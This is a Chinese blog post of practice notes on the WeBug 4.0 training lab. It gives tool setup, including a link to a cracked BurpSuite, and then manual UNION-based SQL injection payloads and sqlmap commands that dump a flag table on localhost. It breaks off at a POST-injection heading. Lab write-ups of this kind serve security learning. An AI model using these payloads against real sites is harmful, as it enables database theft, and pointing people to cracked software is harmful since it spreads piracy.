---
title: WeBug4.0练习笔记
date: 2020-05-19 20:18:48
description: 在webug4.0的测试平台上测试后所写的一些测试笔记
---

> 网络安全测试笔记

## 下载部署

+ WeBug4.0
  - 下载：https://pan.baidu.com/s/1PiipS0Iheegdb2Y0gaFM8w 提取码: rbrg

+ hackbar: 火狐新版hackbar收费，解决方案如下：
  1. 旧版：[https://github.com/HCTYMFF/hackbar2.1.3/archive/master.zip](https://github.com/HCTYMFF/hackbar2.1.3/archive/master.zip)
  2. 替代插件：[https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?src=search](https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?src=search)

## 学习记录

工具准备：

- JAVA环境:
  - 下载：[https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html](https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html)

- Python环境:
  - 当前版本：python-2.7.15rc1.msi
  - 下载：[https://npm.taobao.org/mirrors/python/3.8.3/](https://npm.taobao.org/mirrors/python/3.8.3/) （因为下述使用的sqlmap是基于python2.7的）
  - 配置教程：[Python2.x安装教程及环境变量配置](https://blog.csdn.net/ITLearnHall/article/details/81318939)

> Windows系统不重启而使环境变量生效的方法
> 以修改环境变量`PATH`为例，修改完成后，运行`cmd`，输入`set PATH=C:`，关闭DOS窗口。再次运行`cmd`，输入`echo %PATH%`，可以发现`我的电脑`->`属性`->`高级`->`环境变量`中设置的 `PATH`值已经生效。


- BurpSuie: 
  - 下载链接: [https://pan.baidu.com/s/1F36mvPsWv3Buk0G-UaKr7A](https://pan.baidu.com/s/1F36mvPsWv3Buk0G-UaKr7A) 提取码: 9hzm
  - 配置教程：[最新BurpSuite 1.7.32 破解版[注册机]下载【无后门版】](http://www.vuln.cn/8847)

- sqlmap:
  - 下载链接：[http://sqlmap.org/](http://sqlmap.org/)

### 显错注入

> 报错型：
> 构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）

参考资料：[https://blog.csdn.net/weixin_40709439/article/details/81355856](https://blog.csdn.net/weixin_40709439/article/details/81355856)

#### 方法一：手动注入

1. 由地址的`?id=1`可尝试猜想表的列数，构造`?id=1' order by 1 %23'`，依次推演

2. 发现到`?id=1' order by 3 %23'`报错，猜想列表有两行，构造`' union select 1,group_concat(schema_name) from information_schema.schemata%23`

3. 构造`' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' %23`

4. 构造`' union select 1,flag from webug.flag %23`

#### 方法二：使用sqlmap注入

1. 获取当前id对应的数据库：`python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id --current-db`

![](/images/2020-05-21-20-49-20.png)

2. 获取`webug`数据库存在的表：`python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id -D webug --tables`

![](/images/2020-05-21-20-51-24.png)

3. 获取flag的值：`python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id -D webug -T flag --dump`

![](/images/2020-05-21-20-53-37.png)

----

### 布尔注入：

> 布尔型：
> 页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据

参考资料：[https://blog.csdn.net/weixin_40709439/article/details/81355856](https://blog.csdn.net/weixin_40709439/article/details/81355856)

#### 方法一：手动布尔注入

暂无

#### 方法二：使用sqlmap注入

1. 获取当前数据库：`python sqlmap.py -u  http://localhost/control/sqlinject/bool_injection.php?id=1 -p id --current-db`

![](/images/2020-05-21-21-04-41.png)

2. 获取webug数据库的表：`python sqlmap.py -u  http://localhost/control/sqlinject/bool_injection.php?id=1 -p id -D webug --tables`

![](/images/2020-05-21-21-06-12.png)

3. 获取flag的值，提交FLAG的时候报错！

4. 换个表，`python sqlmap.py -u http://localhost/control/sqlinject/bool_injection.php?id=1 -D webug -T env_list --dump`

![](/images/2020-05-25-19-40-05.png)

5. 获取flag值：fdsafsdfa

----

### 延时注入：

> 时间型：通过页面沉睡时间判断
> 通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据

参考资料：[https://blog.csdn.net/weixin_40709439/article/details/81355856](https://blog.csdn.net/weixin_40709439/article/details/81355856)

#### 方法一：延时注入

暂无

#### 方法二：使用sqlmap注入

1. 方法同上

----

### post注入
